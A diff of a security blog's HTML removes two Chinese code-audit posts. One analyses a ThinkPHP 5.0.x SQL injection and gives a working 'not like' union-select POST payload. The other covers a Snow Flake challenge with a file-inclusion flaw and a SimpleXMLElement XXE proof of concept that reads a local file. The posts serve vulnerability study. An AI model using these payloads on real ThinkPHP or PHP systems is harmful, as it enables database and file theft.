-<p>##<strong>1.基础知识</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
-<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
-<pre><code>#application\index\controller\Index.php
-&lt;?php
-namespace app\index\controller;
-use think\Db;
-use think\Controller;
-class Index extends Controller
-{
-    public function index()
-    {
-        $post_user = input(&apos;post.user/a&apos;);
-        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
-        var_dump($a);
-    }
-}
-</code></pre><p>B.对应数据库下新建表<code>user</code></p>
-<p>##<strong>3.漏洞利用:</strong><br>payload：</p>
-<pre><code>post:user[0]=not like&amp;user[1][0]=aaa&amp;user[1][3]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/ycb34r3alak730vb82c9b6io/image_1co63bm74pidqmhrj148h6db2c.png" alt="image_1co63bm74pidqmhrj148h6db2c.png-43.6kB"></p>
-<p>##<strong>4.代码审计:</strong><br><strong>相关变量已经写到注释中</strong><br>首先从<code>index.php</code>开始分析:</p>
-<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
-</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
-<pre><code>#thinkphp\library\think\db\Query.php 2290行
-public function select($data = null)
-...
-if (false === $resultSet) {
-        // 生成查询SQL
-        $sql = $this-&gt;builder-&gt;select($options);
-        // 获取参数绑定
-        $bind = $this-&gt;getBind();
-...
-</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 692行
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/561s2vvojdrgh5ahacqn8cky/image_1co63sh5e1locbbe1l3epu38hqm.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
-<p>C.跟进<code>parseWhere()</code>函数:</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 224行
-protected function parseWhere($where, $options)
-{   
-    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
-    if (!empty($options[&apos;soft_delete&apos;])) {
-        // 附加软删除条件
-        list($field, $condition) = $options[&apos;soft_delete&apos;];
-        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
-        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
-        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
-    }
-    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
-}
-</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 245行
-public function buildWhere($where, $options)
-    { 
-    ...
-    $whereStr = &apos;&apos;;
-    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
-        foreach ($where as $key =&gt; $val) {
-            $str = [];
-......
-else {//进入
-                    // 对字段使用表达式查询
-    $field = is_string($field) ? $field : &apos;&apos;;
-    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
-
- }
-        }
-
-        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
-    }
-
-    return $whereStr;
-</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 300行
-protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
-    {
-    ...
-    // 检测操作符
-    if (!in_array($exp, $this-&gt;exp)) {//进入
-        $exp = strtolower($exp);
-        if (isset($this-&gt;exp[$exp])) {
-            $exp = $this-&gt;exp[$exp];
-            //$exp:NOT LIKE
-        } 
-    ...
-    $whereStr = &apos;&apos;;
-    ...
-    //like操作有关代码
-    elseif (&apos;LIKE&apos; == $exp || &apos;NOT LIKE&apos; == $exp) {
-        // 模糊匹配
-        //$value:{ [0]=&gt;&quot;aaa&quot; [1]=&gt;&quot;bbb&quot; } 
-        if (is_array($value)) {
-            foreach ($value as $item) {
-                $array[] = $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseValue($item, $field);
-
-            }
-            $logic = isset($val[2]) ? $val[2] : &apos;AND&apos;;
-            //$logic:) and 1=2 union select 1,user(),3 from user--
-            //$array:`ID` NOT LIKE &apos;12&apos; 
-            $whereStr .= &apos;(&apos; . implode($array, &apos; &apos; . strtoupper($logic) . &apos; &apos;) . &apos;)&apos;;
-            //$whereStr:(`ID` NOT LIKE &apos;aaa&apos; ) AND 1=2 UNION SELECT 1,USER(),3 FROM USER-- `ID` NOT LIKE &apos;bbb&apos;)
-        } 
-</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$val</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
-<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
-<pre><code>#thinkphp\library\think\Requests.php 971行
-public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
-...   
-$filter = $this-&gt;getFilter($filter, $default);
-if (is_array($data)) {
-    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
-    reset($data);
-} else {
-    $this-&gt;filterValue($data, $name, $filter);
-}
-
-if (isset($type) &amp;&amp; $data !== $default) {
-    // 强制类型转换
-    $this-&gt;typeCast($data, $type);
-}
-return $data;
-</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
-<pre><code>#thinkphp\library\think\Requests.php 1054行
-private function filterValue(&amp;$value, $key, $filters)
-{
-...
-return $this-&gt;filterExp($value);
-}
-</code></pre><p>跟进<code>filterExp()</code>函数:</p>
-<pre><code>public function filterExp(&amp;$value)
-{
-// 过滤查询特殊字符
-if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
-    $value .= &apos; &apos;;
-}
-// TODO 其他安全过滤
-}
-</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
-<pre><code>x[0]=in&amp;x[1]=1
-</code></pre><p>服务器接收时如果没有进行过滤:</p>
-<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
-</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
-<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
-</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
-<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
-<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/et4fjnsfd12qyuq4brr50wqv/image_1co66mlsb18vjivu13ld1c9tgv49.png" alt="image_1co66mlsb18vjivu13ld1c9tgv49.png-61kB"></p>
-<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/fj5jkb1ax2z3mkcepx3wykfp/image_1co66ji7v9gm1os31p9hpgjj9o20.png" alt="image_1co66ji7v9gm1os31p9hpgjj9o20.png-26.2kB"></p>
-<p>我们可看到这里漏掉了<code>not like</code>这个表达式(添加了一个表达式 但是并没有进行过滤),导致了注入。</p>
-<p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/" itemprop="url">代码审计Day3 - 实例化任意对象漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T23:15:41+08:00">
-                2018-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>##<strong>Day 3 - Snow Flake</strong></p>
-<p>###题目名字:雪花<br>代码如下:<br><img src="http://static.zybuluo.com/chhyx/3skmkh8igvlxdywp9qfrzdr8/image_1cnrfif3p1clakuvd7p1s0g1muv9.png" alt="image_1cnrfif3p1clakuvd7p1s0g1muv9.png-213.8kB"></p>
-<p>###<strong>漏洞产生</strong>:这里的代码存在两个问题<br>1.文件包含漏洞 <code>class_exists($controllerName)</code>当用class_exists()这个函数时 它将会默认调用antoload()这个函数 由于类名我们可控 所以会造成文件包含</p>
-<p>我们看下class_exists()函数</p>
-<blockquote>
-<p><strong>class_exists()</strong>  (PHP 4, PHP 5, PHP 7)<br>定义:class_exists — 检查指定的类是否已定义。<br>参数:bool class_exists ( string \$class_name [, bool \$autoload = true ] )</p>
-</blockquote>
-<p>class_exists() 默认将会尝试调用 <code>__autoload</code>，如果不想让 class_exists() 调用 <code>__autoload</code>，可以将 <code>autoload</code> 参数设为 FALSE。<br>2.在代码中的第九行,由于实例化的对象名<code>$controllerName</code>以及传入类的参数名<code>$data</code>是我们可以控制的 我们就可以去调用PHP内置类<code>SimpleXMLElement</code>来执行xxe攻击读取任意文件</p>
-<p>测试代码:</p>
-<pre><code> &lt;?php
-
-$xml = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT methodName ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///C:/sec/1.txt&quot;&gt;]&gt;&lt;methodCall&gt; &lt;methodName&gt;&amp;xxe;&lt;/methodName&gt;&lt;/methodCall&gt;&apos;;
-
-$xml_class = new SimpleXMLElement($xml,LIBXML_NOENT);
-var_dump($xml_class);
-
-?&gt;
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/gl70z7his5l5e30ssvenwdwl/image_1cnrhc09s50p1f7311rv9k8ah51l.png" alt="image_1cnrhc09s50p1f7311rv9k8ah51l.png-59kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2501,7 +2487,7 @@ var_dump($xml_class);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2514,7 +2500,7 @@ var_dump($xml_class);
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
